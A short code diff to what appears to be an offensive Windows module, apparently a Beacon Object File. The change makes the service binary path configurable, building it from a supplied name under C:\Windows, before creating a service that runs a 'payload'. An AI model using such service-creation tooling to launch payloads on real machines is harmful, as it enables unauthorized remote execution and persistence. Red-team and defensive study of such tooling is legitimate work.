@@ -115,6 +115,10 @@ void go(char *args, int len)
         return;
     }
 
+
+    char payloadPath[MAX_PATH];
+    pSnprintf(payloadPath, sizeof(payloadPath), "C:\\Windows\\%s.exe", binaryName);
+
     SC_HANDLE hSvc = pCreateServiceA(
         hSCM,
         serviceName, // Service name
@@ -123,7 +127,7 @@ void go(char *args, int len)
         SERVICE_WIN32_OWN_PROCESS,
         SERVICE_DEMAND_START,
         SERVICE_ERROR_IGNORE,
-        "C:\\Windows\\Temp.exe", // Path to payload
+        payloadPath, // Path to payload
         NULL, NULL, NULL, NULL, NULL);
 
     if (!hSvc)
